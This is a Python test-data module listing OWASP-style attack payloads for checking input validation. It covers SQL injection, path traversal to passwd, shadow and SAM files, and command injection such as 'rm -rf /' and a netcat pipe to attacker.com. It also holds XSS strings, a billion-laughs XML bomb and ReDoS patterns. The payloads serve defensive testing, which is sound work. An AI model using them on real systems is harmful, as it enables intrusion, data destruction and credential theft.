"""
Malicious payloads for security testing based on OWASP Top 10.

This module contains various attack vectors for testing input validation,
including SQL injection, path traversal, command injection, XSS, and more.
"""

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    # Classic SQL injection
    "'; DROP TABLE watch_folders; --",
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "admin' #",
    "admin'/*",

    # Union-based injection
    "' UNION SELECT NULL--",
    "' UNION SELECT password FROM users--",

    # Boolean-based blind injection
    "' AND 1=1--",
    "' AND 1=2--",

    # Time-based blind injection
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5)--",

    # Tautology attacks
    "1' OR '1' = '1",
    "admin' OR '1'='1'--",

    # Comment-based injection
    "/**/OR/**/1=1",
    "' OR 1=1#",
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    # Unix path traversal
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../../../etc/passwd",

    # Windows path traversal
    "..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\windows\\win.ini",

    # Encoded path traversal
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",

    # Double encoding
    "....//....//etc/passwd",
    "....\\\\....\\\\windows\\system32",

    # Absolute paths (should be rejected if not in allowed scope)
    "/etc/passwd",
    "/var/log/messages",
    "C:\\Windows\\System32\\config\\SAM",

    # Null byte injection
    "../../etc/passwd%00",
    "../../../etc/passwd\x00.txt",

    # Unicode variations
    "..%c0%af..%c0%afetc/passwd",
    "..%c1%9c..%c1%9cetc/passwd",
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    # Semicolon separator
    "; ls -la",
    "; cat /etc/passwd",
    "; rm -rf /",

    # Pipe commands
    "| cat /etc/passwd",
    "| nc attacker.com 4444",

    # Command substitution
    "$(whoami)",
    "`whoami`",
    "$(cat /etc/passwd)",

    # Ampersand separator
    "& whoami",
    "&& whoami",

    # Newline injection
    "\ncat /etc/passwd",
    "%0Acat%20/etc/passwd",

    # Backtick injection
    "`id`",
    "`ls -la`",
]

# XSS (Cross-Site Scripting) Payloads
XSS_PAYLOADS = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",

    # Event handler injection
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg/onload=alert('XSS')>",

    # JavaScript protocol
    "javascript:alert('XSS')",
    "javascript:void(document.cookie)",

    # HTML injection
    "<iframe src='javascript:alert(1)'>",
    "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",

    # Attribute injection
    "' onmouseover='alert(1)'",
    '" onload="alert(1)"',

    # Markdown-based XSS
    "[link](javascript:alert('XSS'))",
    "![image](javascript:alert('XSS'))",

    # Encoded XSS
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
]

# Regular Expression DoS (ReDoS) Patterns
REDOS_PAYLOADS = [
    # Catastrophic backtracking
    ("(a+)+b", "a" * 50),  # Pattern, test string
    ("(a*)*b", "a" * 50),
    ("(a|a)*b", "a" * 50),
    ("(a|ab)*c", "ab" * 25),

    # Nested quantifiers
    ("(.*)*$", "x" * 50),
    ("(.+)*$", "x" * 50),

    # Alternation with overlapping patterns
    ("(a|a|a|a|a|a)*b", "a" * 50),
    ("(a+|a+|a+)*b", "a" * 50),
]

# File Upload Attack Payloads
FILE_UPLOAD_PAYLOADS = {
    # Extremely large files (size in bytes)
    "large_file": {
        "size": 1024 * 1024 * 1024,  # 1GB
        "description": "File exceeding reasonable size limits"
    },

    # Malformed file headers
    "malformed_pdf": {
        "content": b"\x00\x00\x00\x00" + b"PDF" * 1000,
        "description": "PDF with corrupted header"
    },

    # Misleading extensions
    "double_extension": {
        "filename": "document.pdf.exe",
        "description": "Executable disguised as PDF"
    },

    # Null byte injection in filename
    "null_byte_filename": {
        "filename": "innocent.txt\x00.exe",
        "description": "Null byte in filename"
    },

    # Path traversal in filename
    "path_in_filename": {
        "filename": "../../etc/passwd",
        "description": "Path traversal attempt in filename"
    },
}

# XML Billion Laughs Attack (XML Bomb)
XML_BOMB_PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
"""

# NoSQL Injection Payloads (if applicable)
NOSQL_INJECTION_PAYLOADS = [
    {"$ne": None},
    {"$gt": ""},
    {"$where": "1==1"},
    {"$regex": ".*"},
]

# LDAP Injection Payloads
LDAP_INJECTION_PAYLOADS = [
    "*",
    "admin*",
    "*)(&",
    "*)(uid=*))(|(uid=*",
]

# Format String Attack Payloads
FORMAT_STRING_PAYLOADS = [
    "%s%s%s%s%s",
    "%x%x%x%x%x",
    "%n%n%n%n%n",
]

# Oversized Input Payloads
OVERSIZED_PAYLOADS = {
    "extremely_long_string": "A" * 1000000,  # 1 million characters
    "deeply_nested_json": '{"a":' * 10000 + '1' + '}' * 10000,
    "long_line": "x" * 100000 + "\n",
}

# Special Characters and Edge Cases
SPECIAL_CHAR_PAYLOADS = [
    # Null characters
    "\x00",
    "test\x00value",

    # Unicode variations
    "\u0000",
    "\ufeff",  # BOM
    "\u202e",  # Right-to-left override

    # Control characters
    "\r\n",
    "\n\r",
    "\x1b[31m",  # ANSI escape codes

    # Homoglyphs
    "аdmin",  # Cyrillic 'а' instead of Latin 'a'
    "раypal",  # Cyrillic characters
]

# All payloads combined for comprehensive testing
ALL_MALICIOUS_PAYLOADS = (
    SQL_INJECTION_PAYLOADS +
    PATH_TRAVERSAL_PAYLOADS +
    COMMAND_INJECTION_PAYLOADS +
    XSS_PAYLOADS +
    LDAP_INJECTION_PAYLOADS +
    FORMAT_STRING_PAYLOADS +
    SPECIAL_CHAR_PAYLOADS
)
